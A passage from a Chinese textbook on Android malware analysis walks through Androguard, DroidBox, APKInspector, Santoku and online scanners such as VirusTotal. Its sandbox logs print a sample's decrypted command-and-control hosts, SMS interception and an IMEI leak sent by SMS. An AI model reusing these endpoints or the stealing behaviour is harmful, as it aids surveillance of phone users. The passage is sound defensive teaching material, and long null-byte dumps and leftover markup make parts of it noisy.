Android可以按照用户指定的格式显示Android apk文件的所有类和子方法的信息流，可以用于跟踪调用方法和被调用方法。基于这种原理，在线服务会提供恶意代码的信息流。

 </div>

 </div>

也有功能可以形象地显示与此相同的信息。使用androgexf.py工具可以转换为gexf文件格式，然后快速查看方法信息之间的连接状态。

androgexf.py -i Loozfon.apk -o Loozfon.gexf

生成的gexf文件安装并查看gephi（http://gephi.org）viewer程序。

 </div>

选择方法后与连接的其他方法一起加亮显示。如图3-43所示，点击起始点OnCreate()函数后跟踪其他派生方法。

 </div>

点击顶端 “Data Laboratory” 按钮后，可以用数据格式查看各方法信息。

Workspace 0 ✗

 </div>

#### 3.4.5 使用Androdiff和Androsim比较文件

Androdiff可以分析两个Android软件包的不同之处。Android恶意代码会在正常软件包内插入恶意功能（发送短信、发送联系人信息等），此时用肉眼是看不出区别的。可以使用Androdiff掌握类和方法的哪个部分被添加，或有哪些不同和相同的部分。可用于检测正常App是否遭到修改。

androguard-1.6# ./androdiff.py -i MonkeyJump2.0.apk Mobile-Challenge.apk >
androdiff_result.txt
androguard.core.bytecodes.dvm.DalvikVMFormat object at 0x88d3d4c>
<androguard.core.analysis.analysis.VMAnalysis instance at 0x891474c>
<androguard.core.bytecodes.dvm.DalvikVMFormat object at 0x88c958c>
<androguard.core.analysis.analysis.VMAnalysis instance at 0x9adc60c>
warning: compressor SNAPPY is not supported (use zlib default compressor)
Elements:
IDENTICAL: 11
SIMILAR: 135
NEW: 42
DELETED: 276
SKIPPED: 0

warning: compressor SNAPPY is not supported (use zlib default compressor)
[ ('Lcom/dseffects/MonkeyJump2/jump2/a/Abstract', 'describeContents', '()I') ]
<-> [ ('Android/game/tetris/ITetrisConstants', '<clinit>\',
'()V') ]
<clinit>-BB@0x14 describeContents-BB@0x0
Added Elements(1)
0x14 0 fill-array-data-payload fill-array-data-payload
\xf4\xff\xff\xff\x0c\x00\x00\x00\xe8\xff\xff\xff\xff\xff\xff\x01\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\

Androsim与Androdiff的功能类似。使用默认设置只能看到相同部分所占的百分比（%），所以在只需知道简单结果时会比较有用。

root@honeynet:/home/android/tools/androguard-1.6# ./androsim.py -i
MonkeyJump2.0.apk Mobile-Challenge.apk
warning: compressor SNAPPY is not supported (use zlib default compressor)
Elements:
IDENTICAL: 11
SIMILAR: 135
NEW: 42

DELETED: 276
SKIPPED: 0
warning: compressor SNAPPY is not supported (use zlib default compressor)
--> methods: 66.056039% of similarities

AndroGuard中的工具就介绍到这里,第4章会讲解分析手机恶意代码时该如何使用这些工具。

### 3.5 使用 DroidBox 进行自动分析

本节讲解如何使用DroidBox进行自动分析。此工具也包含在 ARE中，所以接着3.4节进行即可。如果没能完全理解本节的自动分析示例，那么看完4.2节后重新阅读时会有新的收获。第4章介绍的在线分析服务也会用到DroidBox功能，所以本节会进行简单介绍，也为了说明此款工具也能用于开发在线自动分析工具。

DroidBox可以自动对Android App进行动态分析，可以用多种格式导出日志文件。结果文件包含以下内容。

☐ 被分析软件包的散列值

☐ 内/外部通信数据信息

☐ 读/写文件操作信息

☐ 以DexClassLoader开始的服务和类信息

☐ 由网络、文件、SMS泄露的信息

☐ 绕过的权限信息

☐ 使用Android API操作的密码活动

☐ 广播接收器项目

☐ 发送SMS、通话信息

#### 3.5.1 path中添加adb命令

DropBox的adb路径被设置为相对路径，为了在任何位置都能运行adb命令，需要把adb添加到path变量。之后要使export命令每次随OS一起启动，如需持续保存则需添加到.bashrc文件。

使用export命令设置path路径如下。

export PATH=$PATH:/home/android/tools/android/android-sdk-linux_x86/platform-tools/
export PATH=$PATH:/home/android/tools/android/android-sdk-linux_x86/tools/

#### 3.5.2 使用Android SDK Manager升级Packages

如果想使用DroidBox进行分析，最好始终保持SDK为最新版，所以需要升级。本书也为了使用Android21版本而进行了升级。使用如下命令可以根据SDK版本进行升级，不会像刚开始安装SDK时那样需要太多时间，可以选择“Accept All”全部升级，这样会有利于之后的诊断工作。

root@honeynet# home/android/tools/android/android-sdk-linux_x86/tools/android update SDK

 </div>

升级完成后移动到/tools/droidbox，自动对apk文件进行动态分析。会用到Android21 AVD，它会在升级SDK时自动生成。运行#startemuy.sh Android21命令查看模拟器是否正常运行。

 </div>

通过#./droidbox.sh 000.apk命令执行，等待一段时间后就会运行AVD，可实时查看积累的Sandbox日志。如果想浏览日志文件，可以输入Ctrl+C终止运行，或在运行之前输入./droidbox.sh 000.apk > log.txt命令将日志保存到文本文件。

 </div>

DroidBox诊断完成后查看结果信息，如图3-48所示。顶端显示apk文件的散列值，可以看到API使用与否和危险与否等信息。

 </div>

   </div>

oot@honeynet:/home/android/tools/droidbox# ./droidbox.sh MonkeyJump2.0.apk

[Info]

File name: MonkeyJump2.0.apk
MD5: e0106a0f1e687834ad3c91e599ace1be
SHA1: 179e1c69ceaf2a98fdca1817a3f3f1fa28236b13
SHA256:
632e3c9be2bc616bf2ca2908194cf8f5cf8bbdcf865262f0bbce59380e5c0466
Duration: 143.824863911s

[File activities]

[Read operations]

[27.8503770828] Path:

/data/data/com.dseffects.MonkeyJump2/shared_prefs/com.dseffects.MonkeyJump2_preferences.xml

Data: <?xml version='1.0' encoding='utf-8'

standalone='yes' ?>

<map>

<string name="hkey7">8582ac70d93824dbaef87b87f1740969752f7edf778a0f6c</string>

<int name="lastIndex" value="0" />

<string name="hkey8">bfe19c387d318bb201571839c01bb3d9df10f333c75b22b7</string>

<string name="hkey9">d86270ab01c1791740634cd42ccd3160752f7edf778a0f6c</string>

<int name="hLength" value="11" />

<string name="hkey2">11a26b72f2a03c86aa6c742b5b62af6c752f7edf778a0f6c</string>

<string name="hkey1">0d27e799584e494031a69f30b4d74c74df10f333c75b22b7</string>

<string name="hkey0">efaf9e30fee22b96131de17c6793d6f2df10f333c75b22b7</string>

<string name="hkey10">5ee24082afa27568f4f1e0acc961d767dd7e9ad2131ec4c3</string>

<string name="hkey6">9a9b5cd5e7d83bce7105c13595664e67df10f333c75b22b7</string>

<string name="hkey5">38e62db5062dd9abb3791b0dbbf5375cdf10f333c75b22b7</string>

<string name="hkey4">0f04c59bbe85adf23f722a805bec179ddd7e9ad2131ec4c3</string>

<string name="hkey3">85de3781de9da3b8bd6637d31cf4c70bdd7e9ad2131ec4c3</string>

</map>

[Write operations]

[Crypto API activities]

[27.6140239239]

[27.6694469452]

[27.9910180569] Operation: {decryption} Algorithm: DES
Data: {www.widifu.com:8080}
[28.0105969906] Operation: {decryption} Algorithm: DES
Data: {www.udaore.com:8080}
[28.0377519131] Operation: {decryption} Algorithm: DES
Data: {www.frijd.com:8080}
[28.0585110188] Operation: {decryption} Algorithm: DES
Data: {www.islpast.com:8080}
[28.0788209438] Operation: {decryption} Algorithm: DES
Data: {www.piajesj.com:8080}
[28.0943009853] Operation: {decryption} Algorithm: DES
Data: {www.goewsl.com:8080}
[28.1198439598] Operation: {decryption} Algorithm: DES
Data: {www.weolir.com:8080}
[28.1401870251] Operation: {decryption} Algorithm: DES
Data: {www.uisoa.com:8080}
[28.154460907] Operation: {decryption} Algorithm: DES
Data: {www.riusdu.com:8080}
[28.1755800247] Operation: {decryption} Algorithm: DES
Data: {www.aiucr.com:8080}
[28.1872639656] Operation: {decryption} Algorithm: DES
Data: {117.135.134.185:8080}
[30.1183140278] Operation: {decryption} Algorithm: DES
Data: {debug_internal}

[25.7418138981] Destination: localhost Port: 5432
[25.788007021] Destination: localhost Port: 4501
[25.8057529926] Destination: localhost Port: 6543
[27.6942820549] Destination: localhost Port: 8791
[133.571346045] Destination: localhost Port: 123
[Outgoing traffic]

[133.571358919] Destination: localhost Port: 123
Data: ?L?/??
[Incoming traffic]

[DexClassLoader]

[Broadcast receivers]

com.dseffects.MonkeyJump2.jump2.f Action:
droid.provider.Telephony.SMS_RECEIVED
[Started services]

25.8191609383 Class: com.dseffects.MonkeyJump2.jump2.c.AndroidIME
[Enforced permissions]

[Permissions bypassed]

[Information leakage]

[Sent SMS]
[Phone calls]

图3-49显示了按时间段检测App产生权限的图表，可以由此预测App运行后会在哪个时间点做哪些特定行为。首先运行网络（net open）和服务（Service）后，导入特定文件（file open）。

 </div>

下面是对DroidBox提供样本的测试结果，底端可以看到使用SMS发送给特定号码的操作。

root@honeynet:/home/android/tools/DroidBox23# ./startemu.sh AD_Test
root@honeynet:/home/android/tools/DroidBox23# WARNING: Data partition already in use. Changes will not persist!
WARNING: SD Card image already in use:
/root/.android/avd/AD_Test.avd/sdcard.img
WARNING: Cache partition already in use. Changes will not persist!
emulator: emulator window was out of view and was recentered
root@honeynet:/home/android/tools/droidbox# ./droidbox.sh
DroidBoxTests.apk

##### ^C . [* ] Collected 34 sandbox logs

##### [Info]

File name: DroidBoxTests.apk
MD5: aabdfae011e3e9cfc3519520350b0641
SHA1: 8c189ee0fe385769dab515a20d9eec63c608ee8c
SHA256:
ee093aa086a1638edd22823ec3c806828caf40ee41f1f48367c172b516c9e070
Duration: 128.389439106s
[File activities]
[Read operations]
[0.00143599510193] Path:
/data/data/ll.ap.ken/shared_prefs/pref.xml
Data:<?xml version='1.0' encoding='utf-8'
standalone='yes'?>
<map>
<string name="ALR_SEND">true</string>
</map>
[15.5491800308] Path:
/data/data/droidbox.tests/files/myfilename.txt
Data: Write a line
[15.5726079941] Path:
/data/data/droidbox.tests/files/output.txt
Data: null
[Write operations]
[15.5114431381] Path:
/data/data/droidbox.tests/files/myfilename.txt
Data: Write a line
[15.5272660255] Path:
/data/data/droidbox.tests/files/output.txt
Data: null
[Crypto API activities]
[15.6281859875] Key:{0, 42, 2, 54, 4, 45, 6, 7, 65, 9, 54, 11, 12, 13, 60, 15} Algorithm: AES
[15.6442539692] Operation: {encryption} Algorithm: AES
Data:{357242043237517}
[15.6559729576] Key:{0, 42, 2, 54, 4, 45, 6, 7, 65, 9, 54, 11, 12, 13, 60, 15} Algorithm: AES
[15.6702311039] Operation: {decryption} Algorithm: AES
Data:{357242043237517}
[15.6820349693] Key:{0, 42, 2, 54, 4, 45, 6, 8} Algorithm: DES
[15.6960110664] Operation: {encryption} Algorithm: DES

[15.7084081173] Key: {0, 42, 2, 54, 4, 45, 6, 8} Algorithm: DE
[15.7204251289] Operation: {decryption} Algorithm: DES
Data: {357242043237517}
[82.3522241116] Operation: {decryption} Algorithm: DES
Data: {IMEI}
[82.3523130417] Operation: {decryption} Algorithm: DES
Data: {IMSI}
[82.3523790836] Operation: {decryption} Algorithm: DES
Data: {CPID}
[82.3524451256] Operation: {decryption} Algorithm: DES
Data: {_value@}
[82.3552601337] Operation: {decryption} Algorithm: DES
Data: {PTID}
[82.3638391495] Operation: {decryption} Algorithm: DES
Data: {_value@}
[82.373789072] Operation: {decryption} Algorithm: DES
Data: {SALESID}
[82.3858830929] Operation: {decryption} Algorithm: DES
Data: {_value@}
[82.3893229961] Operation: {decryption} Algorithm: DES
Data: {DID}
[82.3997120857] Operation: {decryption} Algorithm: DES
Data: {_value@}
[82.4080619812] Operation: {decryption} Algorithm: DES
Data: {sdkver}
[82.4160540104] Operation: {decryption} Algorithm: DES
Data: {autosdkver}
[82.4274010658] Operation: {decryption} Algorithm: DES
Data: {latitude}
[82.4371399879] Operation: {decryption} Algorithm: DES
Data: {longitude}
[82.4470300674] Operation: {decryption} Algorithm: DES
Data: {debug_outer}
[82.4561460018] Operation: {decryption} Algorithm: DES
Data: {debug_internal}
[Opened connections]
[65.4397721291] Destination: localhost Port: 123
[Outgoing traffic]
[65.4402470589] Destination: localhost Port: 123
Data: ?L???O?
[Incoming traffic]
[exClassLoader]
broadcast receivers]

.SMSReceiver

[Started services]

Action: android.provider.Telephony.SMS_RECEIVED

[Enforced permissions]
[Permissions bypassed]
[Information leakage]
[16.3011231422] Sink: SMS
Number: 0735445281
Tag: TAINT_IMEI
Data: 92a871af351ba747d7789b67f09c817b
[Sent SMS]
[16.2684540749] Number: 0735445281
Message: Sending sms...
[Phone calls]
[16.3012869358] Number: 123456789
[17.2330980301] Number: 123456789

因为ARE也包含了很多基于Android的诊断工具，所以必须根据需要定期升级。又因为要考虑兼容性，所以升级还需谨慎。Honeynet（http://www.honeynet.org）会定期更新相关信息。可以从下列网址获取升级脚本。

https://github.com/xanda/AREsoft-updater/blob/master/AREsoft-updater.sh

测试结果在没有错误的情况下正常进行了升级，如图3-51所示。

ARE并未默认安装curl程序，所以为了正常升级，需要运行sudo apt-get install curl命令进行安装。

 </div>

   </div>

如图3-51所示，升级正常完成就会显示DONE字符。

 </div>

### 3.6 使用 Sublime 插件进行分析

本节将介绍分析Android可执行文件的代表性工具——AndroGuard及其插件，还会介绍如何使用可支持多语言的Sublime进行分析。AndroGuard升级到1.9版本后最大的亮点是，它提供了Sublime插件。AndroGuard 1.9的下载地址如下。

http://androguard.blogspot.fr/2012/12/androguard-19.html

短链接：http://goo.gl/GqymLe

插件下载地址如下。

http://code.google.com/p/androguard/downloads/detail?name=ag-st-1.9.zip

短链接：http://goo.gl/SraI44

插件的使用方法很简单。依次点击菜单 “Preferences > Browse Packages…” 打开相关文件夹，在这个目录里解压下载的文件即可。目录的默认位置是 “C:\Users\用户名\AppData\Roaming\Sublime Text 2\Packages”。如果想知道是否正常应用，可以查看菜单 “View > Syntax” 下是否注册了 ap-st。若已注册即可支持 apk 文件和 dex 文件。

 </div>

 </div>

打开apk文件后，按Ctrl+F5键显示apk文件的结构，如图3-54所示。可以看到，类似解压后的目录树中没有显示所有目录和文件。换言之，只显示了必要信息和需要分析的对象。

 </div>

接下来会看到这个插件的优点。双击classes.dex文件显示相关信息。

 </div>

使用Smali字节码格式显示，可以直接查看相关函数值。该插件最大的优点在于，可以通过双击函数、值进行跟踪。在编辑器中，即使反编译也很难逐个跟踪调用和被调用的部分，现在居然支持这种功能，不得不说是一件很惊人的事情。

如果可以逆向分析Smali字节码并快速分析Java代码的调用部分，就可以比使用Java反编译工具JD-GUI实现更快的操作。

AndroGuard的优势是基于CLI，本插件的优势则是基于GUI。

### 3.7 使用 APKInspector 进行分析

APKInspector $ ^{①} $最初是Honeynet（http://www.honeynet.org）的项目之一，它可以在GUI环境下自动对apk文件进行静态/动态分析。可以使用之前介绍的dex2jar、apktools等全部工具显示Java文件或Dalvik代码等，还可以使用AndroGuard显示图形环境流程图。

Ubuntu环境下可以下载源代码后运行install.sh文件进行安装，但因其不支持Ubuntu的最新版本（12.04.02以上），所以推荐各位使用ARE。

升级APKInspector后可以看到，增加了比ARE默认安装的程序更多的文件。在“最新升级信息”中可以看到，程序集中升级了源代码的图形流程。

 </div>

 </div>

如果想用GUI环境运行APKInspector，可以执行python startQT.py命令。

 </div>

运行时会浏览AndroidMainfest.xml文件中的API权限信息，然后显示可在攻击中使用的函数警告，如图3-59所示。

android@honeynet:~/tools/apkinspector$ python startQT.py
##Intitialize CALLINOUT
start thread apktool1
I: Baksmaling...
I: Loading resource table...
I: Loaded.
I: Loading resource table from file: /home/android/apktool/framework/1.apk
I: Loaded.
I: Decoding file-resources...
I: Decoding values/* XMLs...
I: Done.
I: Copying assets and libs...
enter APKinfo
permission
android.permission.INTERNET
android.permission.ACCESS_COARSE_LOCATION
android.permission.READ_PHONE_STATE
android.permission.VIBRATE
com.android.launcher.permission.INSTALL_SHORTCUT
android.permission.ACCESS_FINE_LOCATION
android.permission.CALL_PHONE
android.permission.MOUNT_UNMOUNT_FILESYSTEMS
android.permission.READ_CONTACTS
android.permission.READ_SMS
android.permission.SEND_SMS

android.permission.SET_WALLPAPER

android.permission.WRITE_CONTACTS

android.permission.WRITE_EXTERNAL_STORAGE

com.android.browser.permission.READ_HISTORY_BOOKMARKS

com.android.browser.permission.WRITE_HISTORY_BOOKMARKS

android.permission.ACCESS_GPS

android.permission.ACCESS_LOCATION

android.permission.RESTART_PACKAGES

android.permission.RECEIVE_SMS

android.permission.WRITE_SMS

android.permission.INTERNET

per

android.permission.ACCESS_COARSE_LOCATION

per

 </div>

图3-60为显示图形流程、字节码、Java代码等详细内容的主窗口和显示文件夹信息的侧面窗口。

 </div>

浏览相关执行文档或视频时，应该在侧面窗口显示文件信息，但运行后发现该部分没有正常显示。程序可能有些漏洞。在“Classes”中点击相关函数后，需要等待较长时间才会用图形CFG显示。正常显示这部分的内容也会对分析apk文件有很大帮助。

 </div>

第4章要介绍的在线分析服务也会经常用到上述功能。熟悉前面的内容后，使用服务时会在大量信息中快速找到自己需要的信息，希望各位认真学习。

可参考下列网址：

http://maj3sty.tistory.com/993

### 3.8 使用 dexplorer 和 dexdump 进行分析

如前所述，反编译apk文件需要dex2jar、APKTools、JD - GUI等工具。本节介绍的工具虽然使用相同原理，但是不需要这些复杂过程，可以直接在App进行分析。

dexplorer: https://play.google.com/store/apps/details?id=com.dexplorer

dexdump: https://play.google.com/store/apps/details?id=jp.itplus.android.dex.dump

可以在Google Playe Store搜索并安装dexplorer和dexdump。这两个程序的功能相同，用户可根据自己的实际情况选择使用。

首先介绍dexplorer工具。安装运行后选择需要分析的apk文件，可以看到与JD-GUI相同的目录信息和反编译后的文件信息，如图3-62所示。点击需要详细分析的文件就可以看到分析后的详细信息（图3-62右）。因为其与Windows系统下的JD-GUI分析结果相同，所以使用起来会很顺手。如果想查看简单的反编译信息，此工具会比PC软件快捷。

 </div>

接着介绍dexdump。与dexplorer相同。画面中显示的UX未考虑用户体验，可能感觉有些不方便。但是详细分析时可以按Field、Class、Methods排序，这一点比dexplorer好。

   </div>

 </div>

### 3.9 使用 Santoku 分析移动 App

本章之前介绍了分析移动App需要的工具，讲解ARE Live CD时介绍了AndroGuard和DroidBox的使用方法。本节会学习另一个Live CD——Santoku和Live CD工具的使用方法，也会介绍使用Live CD构建环境的示例。

#### 3.9.1 诊断工具Santoku

Santoku $ ^{①} $是viaForensics开发的Android App诊断专用Live CD。主要目的在于移动取证诊断，也可以用于分析手机恶意代码或诊断手机安全等。可以从http://santoku-linux.com/download下载Live CD。目前最新版是0.4版本 $ ^{*} $， $ ^{②} $只能在64位环境下运行，请在虚拟主机上使用的读者注意。占用内存大约是2.2GB。

 </div>

图3-65是Santoku中的诊断程序，之前介绍的很多工具都包含在里面。熟练使用这些工具后，进行App取证、恶意代码分析和服务诊断时会感到很轻松。

 </div>

#### 3.9.2 Santoku安装与运行方法

安装Santoku前，访问下载页面（https://santoku-linux.com/download），点击底端“Download Now”按钮会移动到SourceForge网站进行下载。

 </div>

Kali Linux（BackTrack）、Santoku等Live CD可以不必安装而直接运行。虽然无需安装是Live CD的优点，但是重新启动后，系统更新及其他安装软件、保存在硬盘的文件都会消失，所以大部分Live CD支持硬盘安装。图3-67是使用VMware导入ISO文件的画面，主要有启动Live CD和安装系统的功能。

 </div>

安装过程非常简单。如图3-67所示使用Live CD启动后，可以看到初始画面，如图3-68所示。点击桌面的“Install Santoku”会出现语言设置画面并开始安装。选择“中文（简体）”开始安装。

 </div>

现在开始, 各位只需选择几个选项, 一直点击继续即可。选择安装时下载更新(图3-69左上), 在下一页选择清除整个磁盘并安装Santoku(图3-69右上)。当然, 熟悉Linux系统的用户也可以分区安装系统。但我们通常不会将Live CD用作主系统, 所以也可以不分区安装。安装过程中设置账号和密码后完成安装, 系统就会自动重启(图3-69左下)。系统重新启动后可以导出ISO文件, 然后利用安装的系统进行启动。

 </div>

如果系统安装在VMware虚拟主机上，就必须安装VMware Tools。VMware Tools支持图像或设备等的驱动程序安装，并且支持主系统和虚拟主机之间的文件复制、文件拖拽等便利功能。可以在VMware虚拟主机下端发现一条信息，点击“Install Tools”按钮。

 </div>

点击按钮后，VMwareTool文件会复制到media目录，如图3-71所示。把这个文件复制到用户home目录（与Windows相同，可以使用鼠标右键复制/粘贴）。

 </div>

复制VMwareTool文件后，在菜单中运行命令终端（LXTerminal）如图3-72所示。

 </div>

输入sudo su-命令转换为Root用户。移动到复制VMwareTool程序的目录下，执行tar xvfz VMwareTools-OO.tar.gz命令解压文件。

 </div>

移动到解压后的文件夹，运行vmware-install.sh程序。

 </div>

安装过程中会询问文件修改和安装路径等，此时按回车键进行默认安装即可。安装完成后输入reboot命令重启系统。

 </div>

安装VMware Tools后, 可以随意进行主系统和虚拟主机之间的文件复制, 硬件驱动也会升级, 就像使用本地电脑一样方便。

 </div>

#### 3.9.3 使用 Santoku 对移动 App 进行逆向分析

本节将介绍使用Santoku中的逆向分析工具对Android App进行反编译的过程。因为之前的分析过程中已经介绍了相关工具，所以直接进入实操阶段。

如图3-77所示，先使用dex2jar工具把apk文件转换为dex文件，然后打包为jar文件。此时会生成“App名称_dex2jar.jar”文件，用JD-GUI导入此文件会自动反编译被打包成jar文件的Class文件，还可以浏览Java源代码。是不是很简单呢？

当然，dex2jar是把两种工具结合起来的形态，所以虽然可以分阶段进行，但实际应用中很少这样做。如果没有防止反编译或未被加密，一般会使用dex2jar工具转换为jar文件，然后使用JD-GUI进行反编译并分析。

 </div>

### 3.10 小结

本章讲解了分析Android App时需要的最基本的方法。还有很多此书没有提到的方法，但原理大同小异。只要学会书中内容，分析程序时不会有很大困难。第4章将详细介绍分析恶意代码时必须使用的在线服务分析和手动分析方法。

### 第 4 章

## 恶意代码分析

根据CYREN统计后发布的报告，针对Android移动服务的恶意代码数量正在急剧增长，根本不亚于针对PC的恶意代码数量。

 </div>

(出处：http://www.cyren.co.kr/data/CYREN_Security_Yearbook_KR.pdf)

各位应该也收到过很多垃圾短信。通过短链接（Shorten URL）诱导用户点击相关URL的钓鱼攻击经常发生。下面介绍可以分析这些恶意代码样本的手动诊断方法和在线诊断方法。

### 4.1 使用在线分析服务

支持 “恶意代码分析” 的在线服务有很多。未构建环境以分析收集到的恶意代码时，可以使用在线服务。我经常使用Anubis $ ^{①} $和VirusTotal $ ^{②} $服务，这两个服务使用完全不同的处理方式，显示

结果的形式也不同。此外还会介绍几个其他的服务，使用多个服务取长补短能提高分析效率，希望各位逐一进行测试。

要想查看分析结果，需要熟悉第3章的内容。在线服务也使用之前介绍的工具并实现自动化操作，理解起来应该不会太难。

#### 4.1.1 使用Anubis分析恶意App

Anubis从2012年5月30日开始添加了针对apk文件的分析功能，可以看出，对分别使用TaintDroid、DroidBox、Androguard、apktool程序进行动态分析方面进行了关注。这些程序大部分都使用第3章讲过的软件和概念，所以不会很难。该网站最早对Android App服务进行分析，受到了很大欢迎，但随着包括VirusTotal在内的很多App分析服务的出现，其分析速度较慢的缺点也越来越凸显。

 </div>

各位可以看到我上传的apk测试文件的分析结果（http://me2.do/xGwsN9hw），支持HTML或XML格式浏览。如图4-3所示，查看赋予App的权限设置。权限的重要性已经在第2章提过了。虽然不能仅靠一两种权限进行判断，但是可以通过共同赋予的权限信息，大致判断是否为恶意代码。

 </div>

注册Anubis账号并登录后进行分析，可以在同一页面管理分析过的所有报告。我个人认为，登录后的分析速度更快。

 </div>

#### 4.1.2 使用VirusTotal分析恶意App

VirusTotal（http://www.virustotal.com）使用43家杀毒软件厂商的杀毒引擎进行探测并显示结果，该网站主要用于检查国内外注册的杀毒软件公司是否检测出相关病毒程序。虽然可以查看简单的信息，但是比Anubis提供的信息少。不过，随着持续升级，现在已经可以提供与Anubis类似的详细信息。

 </div>

下面是在VirusTotal上查看可疑apk文件的结果。46家公司中，有35家公司的样品确认为病毒。点击“File detail”标签可以查看详细信息。

##### 结果样本

https://www.virustotal.com/ko/file/01b49fed999c4c998b0c18b632d02001eea00f24f557a346ea59dfc18e15c6b9/analysis/

短链接：http://goo.gl/2K0T1G

 </div>

画面显示了可能在Mainfest中被恶意使用的API信息，底端会显示App文件内可用字符判断的URL信息。凭借这些信息可以充分判断apk文件是否为恶意代码。

 </div>

http://maps.google.com/maps?q=
http://www.baidu.com/
http://162.105.131.113/
http://www.wooboo.com.cn
http://ade.wooboo.com.cn/t/test
http://ade.wooboo.com.cn/a/p1
http://10.0.0.172/t/test
http://10.0.0.172/a/p1
http://schemas.android.com/apk/res/

点击 “附加信息”（Additional information）标签可以看到详细信息，还可以看到散列值和文件大小、文件类型信息。各位应该能看到ssdeep这个单词，接下来详细介绍该部分。

 </div>

